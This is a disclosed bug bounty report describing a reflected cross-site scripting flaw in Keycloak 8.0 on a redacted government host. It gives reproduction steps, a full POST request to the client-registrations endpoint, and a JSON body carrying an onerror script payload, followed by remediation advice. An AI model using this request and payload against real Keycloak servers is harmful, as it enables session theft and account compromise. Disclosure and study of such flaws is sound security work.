# [██████] Reflected XSS via Keycloak on ██████

## Report Details
- **Report ID**: 2126954
- **URL**: https://hackerone.com/reports/2126954
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2023-08-29T01:45:14.375Z
- **Disclosed**: 2023-09-29T17:26:11.442Z

## Reporter
- **Username**: hackeronanywhere
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Description:**
Keycloak 8.0 and prior contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks. A lack of proper input validation made it possible for an attacker to execute malicious JavaScript code on ████████ This reflected XSS would execute after making a POST request with an XSS payload in the path of the request. As a result, the server would directly insert the payload into the response, allowing the XSS to trigger on the page.

## References
https://cure53.de/pentest-report_keycloak.pdf
https://hackerone.com/reports/87040

## Impact

If successful, a cross site scripting attack can severely impact websites and web applications, damage their reputation and relationships with customers. XXS can deface websites, can result in compromised user accounts, and can run malicious code on web pages, which can lead to a compromise of the user's device.

## System Host(s)
███

## Affected Product(s) and Version(s)
█████

## CVE Numbers


## Steps to Reproduce
1. Navigate visit URL https://████/
1. Second step as long as I use recconaisetool I can find hidden directory path `403` / `200`
1. Found directory on "/auth/realms/master/clients-registrations/openid-connect"
1. I see this server used keycloack. and lets see the versions used `chrome-extentions`
1. The server is vulnerable to (XSS) Keycloack `8.0`
1. Intercept request to burp-suite and change `GET` Request to `POST` Request

Here's the HTTP Parameter request that the issue:
```
POST /auth/realms/master/clients-registrations/openid-connect HTTP/1.1
Host: █████
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: ""
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 63

{"<img onerror=confirm('xss_poc_unexpectedbufferc0n') src/>":1}
```
Used the payloads is **`{"<img onerror=confirm('xss_poc_unexpectedbufferc0n') src/>":1}`** boom is executed / effected.

█████████

██████████

## Suggested Mitigation/Remediation Actions
It is recommended not to have error messages rendering as HTML (i.e. having thecontent-type of  text/html), but to rather use plain-text (text/plain) instead. Additionally,HTML characters should be HTML-encoded in the response to prevent MIME-sniffingissues.
https://cure53.de/pentest-report_keycloak.pdf



## Attachments
No attachments
